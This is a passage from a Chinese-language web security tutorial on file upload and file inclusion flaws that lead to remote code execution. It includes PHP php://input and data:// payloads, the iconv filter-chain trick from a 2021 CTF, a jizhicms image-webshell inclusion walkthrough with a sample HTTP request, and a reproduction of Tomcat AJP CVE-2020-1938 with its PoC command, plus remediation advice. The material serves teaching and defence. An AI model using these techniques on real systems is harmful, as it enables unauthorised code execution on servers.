[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254087-b65db180-d3e8-4164-b3b7-0602a21db94c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254087-b65db180-d3e8-4164-b3b7-0602a21db94c.png)

分析第一次上传（图片马）  
[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254262-74fc641b-2bec-4f74-b1f6-4e297b55ea51.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254262-74fc641b-2bec-4f74-b1f6-4e297b55ea51.png)

经过检测后，创建 FileOutputStream 以写入文件，然后通过 BufferedInputStream 读取输入流，并将其写入到服务器上的文件中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254304-42f55cd1-266d-4594-a0b5-03c7a6e74ada.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254304-42f55cd1-266d-4594-a0b5-03c7a6e74ada.png)

第二次上传（rce）

传过来三个参数 path，dir，fileName，并且可以看到 246 行有一个 Tools.copyFile 函数，其中的参数我们均可控，那么我们就可以进到 Tools 中的 copyFile 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254847-6577b8b0-10fa-4dc8-833a-98186ce8d580.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169254847-6577b8b0-10fa-4dc8-833a-98186ce8d580.png)

传进的一个 oldPath 和 newPath，先判断了历史路径文件存不存在，如果存在就进入 if 语句中，并写入到新路径，全程可以看到无过滤

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169255096-d87d5d41-3ccf-4506-bdab-f6dee064960c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169255096-d87d5d41-3ccf-4506-bdab-f6dee064960c.png)

所以就按正常的包构造即可，旧路径不动，只需要把新文件名改个后缀，这样旧文件中的数据就会写入到新文件新路径当中

### **3.3.5 修复 / 预防方案**

白名单验证：仅允许上传已知安全的文件类型，例如图片文件（jpg, png 等），并拒绝所有其他类型的文件。这要求系统能够验证文件的真实类型，而不仅仅是依赖文件扩展名。

文件类型检测：通过检测文件的 MIME 类型或者文件内容的特定标识（如图片文件的头信息）来判断文件类型，而不是仅仅依赖于文件的扩展名。（不推荐，容易绕过）

文件内容扫描：使用病毒扫描工具扫描所有上传的文件，以识别和阻止恶意软件或脚本的上传。

设置文件上传大小限制：限制可上传文件的大小，减少攻击者上传大型恶意文件的机会。（不推荐，部分木马内存较小）

文件存储隔离：不要将上传的文件存储在执行脚本的目录下，避免恶意脚本被服务器执行。可以将文件存储在非 Web 根目录下，并通过安全的方式提供文件访问（例如，通过脚本读取文件内容并输出，而不是直接通过 URL 访问）。

重命名上传文件：为上传的文件重新命名（例如，使用 UUID 或其他随机字符串），避免直接使用用户提供的文件名，这样可以防止目录遍历攻击和文件覆盖攻击

设置强制访问控制：确保文件上传功能只对信任的用户开放，并对用户进行身份验证和授权。

**3.4 文件包含导致 RCE**
------------------

文件包含漏洞允许攻击者将服务器上的文件包含到输出页面中，或者包含远程文件，从而执行恶意代码。主要分为两种类型：本地文件包含（Local File Inclusion, LFI）和远程文件包含（Remote File Inclusion, RFI）。

### **3.4.1 PHP 本地文件包含（LFI）**

众所周知，php 的代码要执行的话，需要后缀名为 php。但 php 当中关于文件包含的函数就可以在文件名为. txt 等其他不同后缀的情况下，执行 php 代码。

可以看到 利用 include 和 require 两个函数，同时包含 1.txt，成功的输出了两次 test 字符。这两个函数的区别在于，如果 include 包含一个不存在的文件只会警告，而 require 会直接停止运行。还有两个函数为 include_once 和 require_once，这两个函数与本身的区别在于，如果已经包含过了目标则不会包含

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169255719-ec57cd04-5ae6-4e05-9be8-e8b149ae2dd0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169255719-ec57cd04-5ae6-4e05-9be8-e8b149ae2dd0.png)

如果目标文件不是 php 代码，则会直接输出目标文件内容

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169255614-7ae32a17-2997-4234-9500-23c7990cdabe.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169255614-7ae32a17-2997-4234-9500-23c7990cdabe.png)

### **3.4.2 PHP 远程文件包含（RFI）+PHP 伪协议**

而 php 当中还有远程文件包含（RFI），在实战中，利用 php 伪协议的配合会有更多的进攻方向与思路。

而要使用远程文件包含需要目标环境

allow_url_fopen = Onallow_url_include = On

这两个参数需要在 php.ini 单独设置，在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off，所以需要我们手动从 Off 改成 On

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169256155-0ca45987-f59e-400d-be87-a4b1a90a00b7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169256155-0ca45987-f59e-400d-be87-a4b1a90a00b7.png)

开启之后我们就可以进行利用了，一般来说，实战当中大部分都是文件包含配合 php://input 或 data:// 进行 RCE 的

先来演示下 php://input

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169256351-f14c67be-7110-4a41-a15e-e114e187d92c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169256351-f14c67be-7110-4a41-a15e-e114e187d92c.png)

Php:// 可以将 post 中的数据当成 php 的代码来执行，如下图即可成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169256431-a91133fe-848b-4b36-a676-09672275b222.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169256431-a91133fe-848b-4b36-a676-09672275b222.png)

还有 data 协议，与 php://input 类似

data:text/plain,<?php%20phpinfo();

data://text/plain,<?php%20phpinfo();?>

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169262581-82ece19a-2d5b-47e3-9abb-3818bcee5a64.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169262581-82ece19a-2d5b-47e3-9abb-3818bcee5a64.png)

### **3.4.3 PHP 文件包含 + 伪协议 + 文件编码特殊 RCE**

2021 年的 hxp CTF 有一道题 “includer’s revenge”，原题链接如下

["includer's revenge" (ctf.link)](https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/)

<?php ($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');

作者解题脚本如下

[Solving "includer's revenge" from hxp ctf 2021 without controlling any files · GitHub](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)

国内解析文章如下

[hxp CTF 2021 - The End Of LFI? - 跳跳糖 (tttang.com)](https://tttang.com/archive/1395/)

从标题我们就可以看出来这是一个关于文件包含的 CTF 题，而解题思路也很巧妙，利用的是 php 伪协议和编码，php 中有一个伪协议很常见也很好用就是 filter，语法如下

php://filter / 过滤器 | 过滤器 / resource = 待过滤的数据流

这个过滤器我们也可以理解为使用 XX 编码，我们先复现一下然后再来解释原理

复现过程很简单，生成一个文件（漏洞文件）

<?php

include $_GET['zac'];

?>

然后打入 poc 就可以发现，我们神奇的 RCE 了

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169263720-f2df1137-29f9-4b72-9fa9-96640824297b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169263720-f2df1137-29f9-4b72-9fa9-96640824297b.png)

单纯一个 include 即可 RCE 的话，大部分人应该想到的都是开启了 allow_url_fopen(一直默认开启) 和 allow_url_include（php5.2 之后默认关闭），然后 poc 应该是? zac=php://input，然后抓包发 post 数据写马，但实际上的环境并没有开启 allow_url_include

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264426-43defb11-bd41-401b-a084-d1d1d7192dd5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264426-43defb11-bd41-401b-a084-d1d1d7192dd5.png)

那我们现在就来解析一下原理，我们都知道 base64 的合法字符除了 26 个英文字母和数字，只有 + = 和 / 三个符号，然后每四个字符为一组，不满三个字符用 0 填充，对于伪协议的编码可以参考 p 牛写的文章

[谈一谈 php://filter 的妙用 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

而在这个 demo 当中，我们使用 base64 独特的特性以及 iconv 编码的多样性，可以让任意文件编码成我们需要的 php 代码格式，然后再进行 include 包含达到 RCE 的目的

通过 zedd 师傅分析，我们可以发现某些编码会让被编码字符前生成一些字符，用案例中最典型的 convert.iconv.UTF8.CSISO2022KR 来示例

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264199-4b1eba8d-10bd-4a0c-8f4f-eb1ff54373ce.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264199-4b1eba8d-10bd-4a0c-8f4f-eb1ff54373ce.png)

这里插一句，因为之前的理解有问题，我一直以为编码会让整个文件编码，也就是文件会在编码后源文件不见了，然后换一个文件可能又是另一种了，比如 windows 下

UTF-16.UTF-7 生成了一大堆字符

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264228-508151f0-3ed9-4dbd-b5be-03cc7093a6e0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264228-508151f0-3ed9-4dbd-b5be-03cc7093a6e0.png)

然后换成了 system.ini 还是一些这样毫无顺序的乱码

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264300-7500af56-aede-4de7-ba78-d4299cf53c5d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264300-7500af56-aede-4de7-ba78-d4299cf53c5d.png)

而实际利用在 linux 与 windows 是不同的，我们以案例中最简单的 C 来举例

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264874-c95777db-c5d8-426a-91bd-28606d9270e6.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169264874-c95777db-c5d8-426a-91bd-28606d9270e6.png)

在进行一次编码后我们可以看到在 robots.txt 数据前生成了一个

$)C

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265055-ca1c8f53-531d-460a-8b4d-6e8460d21533.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265055-ca1c8f53-531d-460a-8b4d-6e8460d21533.png)

在进行两次编码后生成了两个字符

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265251-26d1f2ce-b27b-4704-9d6d-58c050ca6cba.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265251-26d1f2ce-b27b-4704-9d6d-58c050ca6cba.png)

这样我们就知道了最基础的原理，也就是编码后会在开头生成一个特定的字符，并且源文件不会丢失，那么如何去除这个 $) 呢？很简单，利用 base64 不支持其他符号的特性

先 decode 然后 encode 回来

convert.base64-decode|convert.base64-encode

我们可以看到这样就只有 C 了

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265343-d42b081e-2ca5-4aea-aecd-a64a27c96e72.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265343-d42b081e-2ca5-4aea-aecd-a64a27c96e72.png)

再传一遍就是两个单纯的 C

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265445-b0266519-8ce3-4784-b4b0-79d67c37b24c.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265445-b0266519-8ce3-4784-b4b0-79d67c37b24c.png)

通过不断的编码字符，然后一步步拼凑成我们需要的一句话格式

最后使用 include 包含这个文件，不管后面的文件代码是什么，我们都可以执行我们想要的任意代码

本地的测试环境：

Php 版本为 7.x

虚拟机系统版本

Linux ubuntu 5.15.0-56-generic #62~20.04.1-Ubuntu SMP Tue Nov 22 21:24:20 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

Iconv 版本（如果不支持 iconv 编码的话就用不了这个 trick）

iconv (Ubuntu GLIBC 2.31-0ubuntu9.2) 2.31

以下为全字符编码

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265940-a6d54d88-596a-4942-83e8-a3fdaa19694b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169265940-a6d54d88-596a-4942-83e8-a3fdaa19694b.png)

### **3.4.4 PHP 文件包含案例**

下载链接

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169266055-48a6138e-84f6-40c7-8fd3-c4d2619ddae1.png)](https://foruda.gitee.com/attach_file/1677616483454915405/jizhicms_beta1.9.5.zip?token=a0c7e022726f10052383a7d4ff3122f7&ts=1706834096&att>https://foruda.gitee.com/attach_file/1677616483454915405/jizhicms_beta1.9.5.zip?token=a0c7e022726f10052383a7d4ff3122f7&ts=1706834096&attname=jizhicms_Beta1.9.5.zip</a></p><p></p><p>访问 / install 目录进行安装</p><p></p><p><a href=)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169266112-8c7da128-ceb3-4f46-869e-0b61304d8d04.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169266112-8c7da128-ceb3-4f46-869e-0b61304d8d04.png)

利用过程

前台注册账号

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169266143-7cad3a88-efeb-4a12-97ac-cf662730cdba.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169266143-7cad3a88-efeb-4a12-97ac-cf662730cdba.png)

注册完后提交一条留言

POST /message/index.html HTTP/1.1

Host: localhost

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: [http://10.2.101.24/admin.php/Index/index.html](http://10.2.101.24/admin.php/Index/index.html)

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=2krod2hbsn95ka3b2hdpfreoh2;

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 79

tid=999&user=maple&title=maple&tel=18511111111&email=jizhicms%40qq.com&body=maple

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169266212-9d2fe41b-0283-4421-8e52-179704dd502a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169266212-9d2fe41b-0283-4421-8e52-179704dd502a.png)

然后上传一个头像，其中内容是 <?php phpinfo();?>

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267624-5e231e07-5ba3-4885-9e57-924faef4660f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267624-5e231e07-5ba3-4885-9e57-924faef4660f.png)

右键头像 复制文件地址即可得到路径

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267602-381fcf8e-5dd1-4586-8a35-9feff426f040.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267602-381fcf8e-5dd1-4586-8a35-9feff426f040.png)

进入后台

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267688-ee57efc9-0928-45d4-9e5b-1df8711e3e69.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267688-ee57efc9-0928-45d4-9e5b-1df8711e3e69.png)

基本设置 -> 高级设置 -> 是否留言自动审核 √

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267714-24a0562b-6ca5-4448-80d6-527a5183d9f1.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267714-24a0562b-6ca5-4448-80d6-527a5183d9f1.png)

模型列表 ->message-> 编辑

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267746-a213912d-81da-484f-8312-d765d4fcf2b2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169267746-a213912d-81da-484f-8312-d765d4fcf2b2.png)

更改详情模板为

@../../static/upload/2024/02/02/202402021359.jpg

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269284-044abc1d-5d58-4f64-a4a5-92dccbe53fad.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269284-044abc1d-5d58-4f64-a4a5-92dccbe53fad.png)

审核该留言，并访问 / message/details.html?id=1

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269203-36bdd35f-f23c-4e0d-9417-6123fb9582f0.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269203-36bdd35f-f23c-4e0d-9417-6123fb9582f0.png)

成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269353-2cf0a898-f8f8-40c8-a9e6-8e77085e7451.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269353-2cf0a898-f8f8-40c8-a9e6-8e77085e7451.png)

代码审计：

漏洞点入口为 details，前面先是判断 id 是否存在且留言是否被审核，此时的 $msg 就是我们留言的信息。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269440-d4419e70-89d4-4f14-b120-46528d14d1ba.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269440-d4419e70-89d4-4f14-b120-46528d14d1ba.png)

赋值后进入到 display 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269598-55a13130-8d51-4ea1-a643-63f6b29d0fff.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169269598-55a13130-8d51-4ea1-a643-63f6b29d0fff.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270229-79a1a09d-dc65-4a5b-a0a0-b6a954acd8c4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270229-79a1a09d-dc65-4a5b-a0a0-b6a954acd8c4.png)

传的参数就是我们的详情模板参数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270229-6c17ce33-d000-4ec6-a0fa-cd383c3ada60.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270229-6c17ce33-d000-4ec6-a0fa-cd383c3ada60.png)

往下跟踪，在 52 行当中，把参数里的 @替换为空，然后再用 $this->template 解析

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270303-9e3b3ffa-613f-493a-bbe5-40cdf60edc86.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270303-9e3b3ffa-613f-493a-bbe5-40cdf60edc86.png)

跟下去后发现还有 template_html 解析

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270375-024b04fa-3476-4f73-a6cb-695457265ab5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270375-024b04fa-3476-4f73-a6cb-695457265ab5.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270435-f81c4fa1-9d16-4fce-a917-e4bbc1f9cfd3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169270435-f81c4fa1-9d16-4fce-a917-e4bbc1f9cfd3.png)

在参数前写入 <?php if (!defined('CORE_PATH')) exit();?>，判断是否定义了 CORE_PATH，如果没有定义就直接退出，后面就是我们传的图片中的内容 phpinfo()

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271144-60224d39-a015-4349-bb48-66139f71ce19.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271144-60224d39-a015-4349-bb48-66139f71ce19.png)

进行包含

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271146-f3571372-9437-43a0-924f-dd977666ec41.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271146-f3571372-9437-43a0-924f-dd977666ec41.png)

正常如果直接访问该文件地址是无法显示的

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271205-cacc8fdb-fc14-4e41-b42c-17b2d7da2e05.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271205-cacc8fdb-fc14-4e41-b42c-17b2d7da2e05.png)

但此时的 CORE_PATH 是已经定义了的，所以可以直接进行包含 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271353-8a0d6879-e1d4-4b76-a3dc-753fd34b2224.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271353-8a0d6879-e1d4-4b76-a3dc-753fd34b2224.png)

### **3.4.5. JAVA 文件包含方式**

Java 代码也是利用 include 进行文件包含，可以看到成功的解析了 test.jsp

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271393-bbbac6ae-a0f4-4029-a369-3c833727d683.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271393-bbbac6ae-a0f4-4029-a369-3c833727d683.png)

但不同于 php，java 的文件包含无法对. txt 文件中的 java 代码进行解析，所有危害有限，一般作为任意文件读取或下载。但除非是被包含的 jsp 文件，正常方式无法访问到且其中存在危险函数，这时就可以利用文件包含打 RCE 了

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271895-2aaf84f0-c3ff-4b52-867d-55cb4cb0b7a5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169271895-2aaf84f0-c3ff-4b52-867d-55cb4cb0b7a5.png)

### **3.4.6 JAVA 文件包含案例**

这里选用 CVE-2020-1938 来作为案例

官网下载

[https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.94/bin/](https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.94/bin/)

进入目录中双击 startup.bat 启动

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272334-e8edd678-1994-47f4-856e-dd2efac129ad.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272334-e8edd678-1994-47f4-856e-dd2efac129ad.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272139-f86078bb-bfc3-4505-a62f-00a801096780.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272139-f86078bb-bfc3-4505-a62f-00a801096780.png)

使用 poc 复现

因为我是 python3，所以需要做下小改动

改动 1

将 print("".join([d.data for d in data])) 改成 print("".join([d.data.decode('utf-8') for d in data]))

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272250-56db70c9-948f-4e82-b668-33015c5a3e8b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272250-56db70c9-948f-4e82-b668-33015c5a3e8b.png)

改动 2

将 self.stream = self.socket.makefile("rb", bufsize=0)

改成 self.stream = self.socket.makefile("rb", buffering=0)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272231-27ae687d-68fd-4f2c-bb46-d05b937f9c50.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272231-27ae687d-68fd-4f2c-bb46-d05b937f9c50.png)

RCE 需要

将 / asdf

改成 / asdf.jspx

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272997-13edd808-3ae2-440b-8196-1bb5233d9f53.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169272997-13edd808-3ae2-440b-8196-1bb5233d9f53.png)

该漏洞 RCE 需要有一个文件，任意类型，这里选用 txt，为了演示这里直接在 ROOT 目录下创建了一个，实战需要有上传点。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273019-20a311c3-06ae-4735-9b0e-e90092e3e1bc.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273019-20a311c3-06ae-4735-9b0e-e90092e3e1bc.png)

python3 CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f exec.txt

成功 RCE

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273017-c2c35b40-1cca-4fc4-8a34-d3d4ecb4660a.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273017-c2c35b40-1cca-4fc4-8a34-d3d4ecb4660a.png)

漏洞复现：

官网下载源码

[https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.94/src/apache-tomcat-7.0.94-src.tar.gz](https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.94/src/apache-tomcat-7.0.94-src.tar.gz)

在 server.xml 中可以看到，tomcat 默认会启动 8009 端口，使用 AJP 协议

AJP（Apache JServ Protocol）协议是一种在 Apache HTTP 服务器和后端容器（如 Tomcat）之间传输数据的协议。它是为了提高 Web 服务器与应用服务器通讯效率而设计的，特别适合用于传输 HTTP 请求的环境。AJP 协议比 HTTP 协议更轻量级，因为它是二进制协议，而 HTTP 是基于文本的。这使得 AJP 在处理请求时能够更快，减少了网络传输的开销。

AJP 的工作原理如下：客户端请求：用户的浏览器发送一个请求到 Web 服务器（Apache）。

Apache 到 Tomcat：如果配置了 AJP 协议，Apache 服务器会将接收到的 HTTP 请求转换成 AJP 格式的请求，然后通过 AJP 协议将这个请求发送给后端的应用服务器（如 Tomcat）。处理请求：应用服务器接收到 AJP 格式的请求后，就像处理普通 HTTP 请求一样处理它，并生成响应。

响应客户端：应用服务器将响应发送回 Apache 服务器，Apache 服务器再将这个响应转发给客户端。

AJP 协议主要使用了两个端口：AJP/1.3 通常使用端口 8009，而 AJP/1.2 使用端口 8007。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273125-f58563d5-6cd3-437a-b218-e42dffe882fe.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273125-f58563d5-6cd3-437a-b218-e42dffe882fe.png)

核心解析代码在 AbstractAjpProcessor.java 中，使用 while 来循环读取请求头消息（requestHeaderMessage），然后用 getByte 读取一个属性代码 attributeCode。当他为 Constants.SC_A_REQ_ATTRIBUTE，通过一系列的 if-else if 语句，根据属性名称 n 对特定属性进行处理，而这里对于其他属性，直接将属性名和值添加到请求的属性中 request.setAttribute(n, v);

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273143-d8b801df-4c2a-4932-9c4f-ceae5ed8afd2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273143-d8b801df-4c2a-4932-9c4f-ceae5ed8afd2.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273924-b2faf509-59b9-4485-8951-0b99df5b956d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273924-b2faf509-59b9-4485-8951-0b99df5b956d.png)

而在 poc 中，这里设置了三个属性值

javax.servlet.include.request_uri

javax.servlet.include.path_info

javax.servlet.include.servlet_path

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273912-a712dbac-3dba-4cd9-93d5-7f8b7e4d96d3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169273912-a712dbac-3dba-4cd9-93d5-7f8b7e4d96d3.png)

在 conf/web.xml 文件中我们可以看到请求回走默认的 Default.Servlet

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274110-1a0472b2-8ead-4504-a458-3d0f75933d12.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274110-1a0472b2-8ead-4504-a458-3d0f75933d12.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274247-bc331df0-ab66-4198-935d-18072276f4d4.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274247-bc331df0-ab66-4198-935d-18072276f4d4.png)

跟进 super.service

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274482-86c9383f-9b7f-446c-b54f-139bcc3392a3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274482-86c9383f-9b7f-446c-b54f-139bcc3392a3.png)

然后进入 doGet 中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274972-079d80b4-7b52-47f6-b7f2-e95d611db3b1.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169274972-079d80b4-7b52-47f6-b7f2-e95d611db3b1.png)

再跟进 serveREsource

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275129-9680a702-bd60-4b54-907e-d45eb1e9df69.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275129-9680a702-bd60-4b54-907e-d45eb1e9df69.png)

继续跟进 getRelativePath，这三个参数就是对应的

javax.servlet.include.request_uri

javax.servlet.include.path_info

javax.servlet.include.servlet_path

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275094-2c288ea8-db63-42d8-aff6-f5d0171baf99.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275094-2c288ea8-db63-42d8-aff6-f5d0171baf99.png)

然后分析核心代码，RCE 的方式，进入 JspServlet 类中的 service，此时 312 中 JspUri 后加的就是我们传入的 pathinfo，在 poc 中就是 exec.txt

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275748-79bc1f29-eb17-4f5f-bd59-be4798c618ce.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275748-79bc1f29-eb17-4f5f-bd59-be4798c618ce.png)

然后代入 serviceJspFile 中解析

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275924-fe5c4346-8eb8-4efb-bfb6-6314a2e1b833.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169275924-fe5c4346-8eb8-4efb-bfb6-6314a2e1b833.png)

跟进，被控参数 jspUrl 被封装成了 JspServletWrapper，然后编译我们的 exec.txt

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276392-a88407d3-2c6f-4a27-bcf5-2914d7a7afde.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276392-a88407d3-2c6f-4a27-bcf5-2914d7a7afde.png)

然后跟进 service，最后用_jspService 进行解析

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276489-20bda508-1020-4ead-a0d7-2351792f0b7f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276489-20bda508-1020-4ead-a0d7-2351792f0b7f.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276693-b4284284-09ec-4308-8c09-40a5250ceaaf.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169276693-b4284284-09ec-4308-8c09-40a5250ceaaf.png)

### **3.4.7 修复 / 预防方案**

输入验证和过滤：对用户输入的文件路径进行严格的验证和过滤，确保只能访问到合法的文件路径。

